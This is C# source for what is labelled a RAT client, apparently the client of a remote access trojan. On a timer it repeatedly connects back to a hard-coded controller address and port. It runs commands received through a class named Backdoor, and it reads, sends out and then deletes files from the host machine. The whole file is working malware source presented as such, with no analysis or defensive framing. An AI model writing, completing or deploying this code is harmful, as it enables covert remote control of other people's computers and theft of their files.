using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RAT_CLIENT
{
	internal class Program
	{
		private static Socket RemoteSocket;

		private static IPEndPoint RemoteEndPoint;

		private static byte[] ReceiveBuffer;

		private static byte[] TransmitBuffer;

		private static string strReceive;

		private static string strTransmit;

		private static bool bConnected = false;

		private static Commands Backdoor;

		private static void Accept(IAsyncResult iar)
		{
			Socket socket = (Socket)iar.AsyncState;
			RemoteSocket = socket.EndAccept(iar);
			ReceiveBuffer = new byte[1024];
			RemoteSocket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, SocketFlags.None, Receive, RemoteSocket);
		}

		private static void Connect(IAsyncResult iar)
		{
			try
			{
				Socket socket = (Socket)iar.AsyncState;
				socket.EndConnect(iar);
				Console.WriteLine("Connected!");
				bConnected = true;
				ReceiveBuffer = new byte[1024];
				socket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, SocketFlags.None, Receive, socket);
			}
			catch
			{
			}
		}

		private static void Receive(IAsyncResult iar)
		{
			Socket socket = (Socket)iar.AsyncState;
			int count = socket.EndReceive(iar);
			strReceive = Encoding.ASCII.GetString(ReceiveBuffer, 0, count);
			Console.WriteLine(strReceive);
			if (strReceive == "exit")
			{
				RemoteSocket.Close();
				bConnected = false;
				return;
			}
			if (strReceive[0] == '/')
			{
				Backdoor = new Commands(strReceive);
				strTransmit = Backdoor.Process();
				if (strTransmit.Contains("@File Transfer@"))
				{
					strTransmit = strTransmit.Replace("@File Transfer@", "");
					byte[] bytes = Encoding.ASCII.GetBytes(Path.GetExtension(strTransmit));
					byte[] array = File.ReadAllBytes(strTransmit);
					TransmitBuffer = new byte[bytes.Length + array.Length];
					Buffer.BlockCopy(bytes, 0, TransmitBuffer, 0, bytes.Length);
					Buffer.BlockCopy(array, 0, TransmitBuffer, bytes.Length, array.Length);
					File.Delete(strTransmit);
				}
				else
				{
					TransmitBuffer = Encoding.ASCII.GetBytes(strTransmit);
				}
				RemoteSocket.BeginSend(TransmitBuffer, 0, TransmitBuffer.Length, SocketFlags.None, Send, RemoteSocket);
			}
			ReceiveBuffer = new byte[1024];
			socket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, SocketFlags.None, Receive, socket);
		}

		private static void Send(IAsyncResult iar)
		{
			Socket socket = (Socket)iar.AsyncState;
			socket.EndSend(iar);
		}

		private static void Main(string[] args)
		{
			System.Threading.Timer timer = new System.Threading.Timer(_Timer_Tick, null, 0, 10000);
			Application.Run();
		}

		private static void _Timer_Tick(object state)
		{
			if (!bConnected)
			{
				Console.WriteLine("Attempting Connection . . .");
				RemoteEndPoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 1234);
				RemoteSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				RemoteSocket.BeginConnect(RemoteEndPoint, Connect, RemoteSocket);
			}
		}
	}
}
